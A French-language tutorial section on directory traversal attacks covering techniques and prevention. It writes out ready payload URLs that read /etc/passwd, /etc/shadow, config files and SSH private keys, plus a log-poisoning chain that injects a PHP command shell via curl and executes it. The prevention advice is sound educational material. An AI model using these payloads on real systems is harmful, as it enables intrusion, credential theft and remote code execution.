### **1. Parcours de répertoires (Directory Traversal)**  
#### **Objectif** :  
Accéder à des fichiers ou répertoires sensibles en dehors du répertoire racine du serveur web (ex. : `/etc/passwd`, logs système, configurations).

---

#### **Techniques d’exploitation** :  
1. **Utilisation de séquences spéciales** :  
   - `../` (dot-dot-slash) pour remonter dans l’arborescence :  
     ```url
     http://victime.com/loadfile.php?file=../../../../etc/passwd
     ```  
   - `%00` (Null Byte Injection) pour bypasser les filtres :  
     ```url
     http://victime.com/include.php?page=../../../../../etc/passwd%00
     ```  
   - Encodage alternatif (UTF-8, URL) :  
     - `..%5C` (Windows), `..%2F` (Linux), `..%c0%af` (encodage UTF-8).  

2. **Exploitation via des vulnérabilités dans les scripts** :  
   - Inclusion dynamique de fichiers en PHP :  
     ```php
     include($_GET['page']); // Exemple de code vulnérable
     ```  
   - Accès à des fichiers de configuration :  
     ```url
     http://victime.com/config.php?file=../../config/database.inc.php
     ```  

3. **Cas réels** :  
   - Accès au fichier `/etc/shadow` pour extraire des hachages de mots de passe.  
   - Lecture de logs Apache (`/var/log/apache/access.log`) pour injecter du code PHP.  

---

#### **Exemples pratiques** :  
- **Vol de clés SSH** :  
  ```url
  http://victime.com/download.php?file=../../../../home/user/.ssh/id_rsa
  ```  
- **Exécution de code via logs** :  
  1. Injecter du code PHP dans un log via une requête HTTP malveillante :  
     ```bash
     curl "http://victime.com/<?php system($_GET['cmd']); ?>" 
     ```  
  2. Accéder au log via Directory Traversal pour exécuter la commande :  
     ```url
     http://victime.com/include.php?file=../../var/log/apache/access.log&cmd=whoami
     ```  

---

#### **Prévention** :  
1. **Validation stricte des entrées** :  
   - Bloquer les séquences `../`, `..%5C`, `%00`.  
   - Utiliser des fonctions comme `realpath()` en PHP ou `Path.GetFullPath()` en .NET pour normaliser les chemins.  

2. **Sandboxing** :  
   - Limiter l’accès à un répertoire spécifique via `chroot()` en Linux ou des permissions système strictes.  

3. **Journalisation et détection** :  
   - Surveiller les tentatives via des logs :  
     ```bash
     grep "directory traversal" /var/log/apache/access.log
     ```  
   - Utiliser des IDS (Intrusion Detection Systems) comme **Snort** pour détecter les patterns malveillants.  

4. **Bonne pratique de développement** :  
   - Éviter les inclusions dynamiques non sécurisées (ex. : `include($_GET['page'])`).  
   - Utiliser des identifiants uniques (UUID) au lieu de noms de fichiers prévisibles.  

---
